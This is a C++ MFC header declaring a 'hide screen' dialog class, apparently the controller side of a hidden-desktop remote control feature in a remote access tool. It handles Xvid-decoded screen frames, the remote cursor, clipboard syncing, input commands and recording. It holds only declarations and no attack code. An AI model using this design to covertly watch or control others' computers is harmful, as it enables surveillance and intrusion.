#pragma once
#include"../../common/CursorInfo.h"
#include"../../common/xvid.h"
#include "XvidQuickDec.h"

#ifdef _DEBUG
#pragma comment(lib, "../../common/xvid_64_d.lib")
#else
#pragma comment(lib, "../../common/xvid_64.lib")
#endif

// CHideScreenDlg 对话框


class CHideScreenDlg : public CDialogEx
{
	DECLARE_DYNAMIC(CHideScreenDlg)

public:
	CHideScreenDlg(CWnd* pParent = NULL, CHpTcpServer* pIOCPServer = NULL, ClientContext *pContext = NULL);
	virtual ~CHideScreenDlg();
	void OnReceiveComplete();

	BOOL			m_bOnClose;					//是否关闭

// 对话框数据
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_HIDE_SCREEN };
#endif

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	DECLARE_MESSAGE_MAP()
public:
	afx_msg void OnClose();
	afx_msg void OnSize(UINT nType, int cx, int cy);
	virtual BOOL OnInitDialog();
	virtual void PostNcDestroy();
	virtual BOOL PreTranslateMessage(MSG* pMsg);
	afx_msg void OnPaint();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
private:
	HICON m_hIcon;
	void DrawTipString(CString str);
	HDC m_hDC, m_hMemDC;
	HBITMAP	m_hFullBitmap;
	LPVOID m_lpScreenDIB;

	CString m_aviFile; // 录像文件名。如果文件名不为空就写入
	//CBmpToAvidif	m_aviStream;
	LPBITMAPINFO m_lpbmi, m_lpbmi_rect;
	UINT m_nCount;

	HCURSOR	m_hRemoteCursor;
	DWORD	m_dwCursor_xHotspot, m_dwCursor_yHotspot;
	POINT	m_RemoteCursorPos;
	BYTE	m_bCursorIndex;
	CCursorInfo	m_CursorInfo;
	BYTE	m_LastCursorIndex;
	CXvidQuickDec m_XvidDec;
	void DrawFirstScreen();
	void DrawNextScreenXvid();


	void ResetScreen();
	void SendResetScreen(int nBitCount);
	bool SaveSnapshot();
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	bool m_bIsFirst;
	bool m_bIsTraceCursor;
	ClientContext* m_pContext;
	CHpTcpServer* m_iocpServer;
	bool m_bIsCtrl;
	void SendNext();
	void SendCommand(MSG* pMsg);

	UINT	m_nFramesCount;
	UINT	m_nFramesPerSecond;
	//自适应
	CRect rect;
	double           m_wZoom;            // 屏幕横向缩放比
	double           m_hZoom;            // 屏幕纵向缩放比
	MYtagMSG* m_MYtagMSG;
	int m_MYtagMSGsize;
	RECT m_rect;
};
